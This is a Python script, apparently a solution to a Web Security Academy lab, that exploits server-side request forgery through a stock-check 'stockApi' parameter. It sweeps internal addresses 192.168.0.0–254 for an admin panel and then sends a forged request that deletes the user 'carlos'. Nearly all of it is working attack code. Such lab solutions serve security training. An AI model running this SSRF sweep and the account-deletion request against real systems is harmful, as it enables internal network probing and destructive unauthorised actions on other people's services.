import requests

requests.packages.urllib3.disable_warnings()


'''

Coded by Kamran Saifullah
https://linkedin.com/in/KamranSaifullah
https://twitter.com/deFr0ggy
https://github.com/deFr0ggy

'''

proxxy = {

    "http" : "http://127.0.0.1:8080",
    "https" : "http://127.0.0.1:8080"

}

defaultData = {
     
    "stockApi" : "http://192.168.0.1:8080/product/stock/check?productId=3&storeId=2"

}

URL = "https://0a7d005a0364a1ce839f3cae00f000be.web-security-academy.net/product/stock"


r = requests.post(URL, data=defaultData, verify=False)
try:
    if r.status_code == 200:

        print(f"[+] URL is accessible with Default POST Data: {URL}")
        print(f"[+] Default payload: {defaultData}")
        print(f"[+] BruteForcing IP Address to find Admin Pane: 192.178.0/24")
        for ip in range (255):
            
            crafted_payload = {

                    "stockApi" : "http://192.168.0.%s:8080/admin" %ip

            }

            print(f"[+] Testing Crafted payload: {crafted_payload}")

            r = requests.post(URL, data=crafted_payload, verify=False)

            if r.status_code == 200: 
                print(f"[+] Crafted payload matched: {crafted_payload}")
                
                matched_payload = {

                    "stockApi" : f"http://192.168.0.{ip}:8080/admin"

                }
 
                if "Admin panel" in r.text:
                    print("[+] Got access to admin panel")
                    print(f"[+] Found Carlos at Offset: {r.text.find('carlos')}")
                    print(f"[+] PATH to delete Carlos Account: {r.text[2821:2821+54]}")

                    Carlos_Payload = {

                    "stockApi" : f"http://192.168.0.{ip}:8080/admin/delete?username=carlos"

                    }

                    r = requests.post(URL, data=Carlos_Payload, verify=False)
                    print("[+] Deleting Carlos User")
                    r = requests.post(URL, data=matched_payload, verify=False)
                    if "Congratulations" in r.text:
                        print("[+] Carlos user has been deleted")
                        print("[-] Lab Completed")
                    else:
                        print("Something went wrong")

                break
            
except:
    print("Something went wrong!")

